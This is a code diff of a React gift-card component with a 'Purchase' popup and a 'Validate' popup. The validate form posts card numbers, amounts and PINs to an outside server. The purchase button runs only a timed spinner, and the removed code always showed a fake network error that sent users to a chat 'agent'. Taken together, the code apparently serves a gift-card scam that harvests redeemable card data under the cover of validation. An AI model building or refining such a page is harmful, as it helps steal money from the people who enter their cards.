@@ -1,4 +1,4 @@
-import {React , useState  } from 'react'
+import {React , useState , useEffect  } from 'react'
 import { HashLink as Link } from "react-router-hash-link";
 import axios from "axios"
 import "./purchaseOrValidate.scss"
@@ -9,55 +9,44 @@ const PurchaseOrValidate = ({card}) => {
   const [purchaseCard , setPurchaseCard] = useState(false)
   const [validateCard , setValidateCard] = useState(false)
   const [isValidating , setIsValidating] = useState(false)
+  const [processing, setProcessing] = useState(false);
+  const [formErrors, setFormErrors] = useState({});
 
-  const [purchaseError, setPurchaseError] = useState(false)
-  const [shouldNavigate, setShouldNavigate] = useState(false);
-
-
-
-  
-   const purchaseCardOpen = () => {
-    setPurchaseCard(true)
-      
-   }
-  const purchaseCardClose = () => {
-    setPurchaseCard(false)
-    setPurchaseError(false); 
-    setIsValidating(false)
-
+  useEffect(() => {
+  if (window.location.hash) {
+    window.location = "/";
   }
-  const handlePurchase = (e) => {
-    e.preventDefault();
-    setIsValidating(true);
-
-    setTimeout(() => {
-      setPurchaseError(true);
-    }, 3000);
-
-
-    setTimeout(() => {
-      setIsValidating(false)
-     }, 3000);
-    
+}, []);
 
 
 
-  }
 
-  const validateCardOpen = () => {
-    setValidateCard(true)
-    
-  }
-  const validateCardClose = () => {
-    setValidateCard(false)
-    setPurchaseError(false);  }
+ const validateInputs = (data) => {
+    const errors = {};
 
+    // Card number: 13–19 digits
+    if (!/^\d{13,19}$/.test(data.cardNumber)) {
+      errors.cardNumber = "Invalid card number";
+    }
 
+    // Amount: must be number and within $20 - $500
+    if (!data.cardAmount || data.cardAmount < 20 || data.cardAmount > 500) {
+      errors.cardAmount = "Amount must be between $20 - $500";
+    }
 
-  const handleValidate = async (e) => {
+    // PIN: 4-6 digits if required
+    if (card.pin) {
+      if (!/^\d{4,6}$/.test(data.pin)) {
+        errors.pin = "Invalid PIN";
+      }
+    }
+
+    return errors;
+  };
+
+    const handleValidate = async (e) => {
 
     e.preventDefault()
-    setIsValidating(true)
     
     const form = e.target
 
@@ -67,35 +56,72 @@ const PurchaseOrValidate = ({card}) => {
       cardName : formData.get("cardName"),
       cardNumber: formData.get("cardNumber"),
       cardAmount : formData.get("cardAmount"),
-      expiryDate: formData.get("expiryDate"),
-      cvv: formData.get("cvv"),
       pin: formData.get("pin"),
     };
+
+    const errors = validateInputs(data);
+    setFormErrors(errors);
+
+    if (Object.keys(errors).length > 0) {
+       return;
+    }
 
     try {
 
       const response = await axios.post('https://ivalidatecards-api.onrender.com/validate', data);
+       setIsValidating(true)
 
-
-      console.log('Response:', response.data);
+        setTimeout(()=> {
+          setIsValidating(false);
+          setProcessing(true)
+        },3000)
 
       window.location.hash = "#submit";
 
-
-     
+    
     } catch (error) {
       console.error('Error:', error.response || error.message);
     } 
     
-      setTimeout(() => {
-      setPurchaseError(true)
-     }, 3000);
+  };
 
-     setTimeout(() => {
+    const handlePurchase = (e) => {
+    e.preventDefault();
+    setIsValidating(true);
+
+    setTimeout(() => {
       setIsValidating(false)
      }, 3000);
 
-  };
+  }
+  
+   const purchaseCardOpen = () => {
+    setPurchaseCard(true)
+      
+   }
+  const purchaseCardClose = () => {
+    setPurchaseCard(false)
+    setIsValidating(false)
+  }
+
+
+  const validateCardOpen = () => {
+    setValidateCard(true)
+    
+  }
+  const validateCardClose = () => {
+    if (window.location.hash === "#submit") {
+      window.location = "/";
+    }
+    setValidateCard(false)
+    setProcessing(false)
+    setFormErrors({})
+
+  }
+
+
+
+
   
  
 
@@ -114,6 +140,7 @@ const PurchaseOrValidate = ({card}) => {
         </div>
         
       </div>
+
       {purchaseCard &&  
         <div className='popupOverlay'>
           <div className="popupContent">
@@ -123,9 +150,6 @@ const PurchaseOrValidate = ({card}) => {
               </div>
               <div className="popupCardContent">
                 <div className="heading">
-                {purchaseError && (
-                    <p className="error-message">Network error, Please click the chat button to get in touch with our agent for a swift response.</p>
-                  )}
                   <h1>{card.name}</h1> 
                 </div>
                 <div className="deliveryInfo">
@@ -153,16 +177,22 @@ const PurchaseOrValidate = ({card}) => {
           </div>
             </div>
          }
+
+
         {validateCard  &&  
         <div className='popupOverlay'>
           <div className="popupContent">    
             <div className="popupCard">
-             
-              <div className="popupCardContent">
+              {processing ? (
+                  <div className="popupCardContent processing">
+                    <img src="/success.png" alt="loading" />
+                    <h2>Validation request is being processed...</h2>
+                  <p>Please wait, this may take a few seconds.</p>
+                  <p cardName="note"><strong>Note:</strong> Please avoid sending multiple validation requests for the same card to prevent network issues.</p>
+                  </div>
+                    ) :
+                  <div className="popupCardContent">
                 <div className="heading">
-                {purchaseError && (
-                    <p className="error-message">Network error, Please click the chat button to get in touch with our agent for a swift response</p>
-                  )}
                   <h1>Verify your {card.name}</h1>
                 </div>
              
@@ -170,25 +200,17 @@ const PurchaseOrValidate = ({card}) => {
                   <input type="hidden" name="cardName" value={card.name} />
 
                   <input className="amount"   name="cardNumber"  type="text" placeholder='enter card number'/>
+                  {formErrors.cardNumber && <p className="error">{formErrors.cardNumber}</p>}
+
                   <input className="amount" type="number" name="cardAmount" placeholder='enter amount' />
-
-
-                    {card.cvv &&  <div>
-                      <input className="amount expiryDate"   name="expiryDate"   type="text" placeholder='expiry date'/>
-                      <input className="amount cvv"   name ="cvv"  type="text" placeholder='cvv'/>
-                    </div>  }
-                    {card.pin && <div>
+                  {formErrors.cardAmount && <p className="error">{formErrors.cardAmount}</p>}
+                    
+                  {card.pin && <div>
                       <input className="amount pin " name="pin"   type="text" placeholder='enter pin'/>
+                        {formErrors.pin && <p className="error">{formErrors.pin}</p>}
+
                     </div>    }
-                    {
-                      card.name === "American Express" && <div>
-                         <input className="amount expiryDate"   name="expiryDate"  type="text" placeholder='expiry date'/>
-                         <input className="amount pin"   name="pin" type="text" placeholder='enter pin'/>
-                         <input className="amount cvv"  name ="cvv"  type="text" placeholder='cvv'/>
-
-
-                      </div>
-                    }
+                    
 
                     <button type="submit">{isValidating ?  (
                   <div className="loading">
@@ -198,7 +220,7 @@ const PurchaseOrValidate = ({card}) => {
                 ): "Validate" }</button>
 
                   </form>
-                </div>
+                </div>}
                 <button className="close-btn">
                   <img onClick={validateCardClose} src="/cancel2.png" alt="" />
                </button>
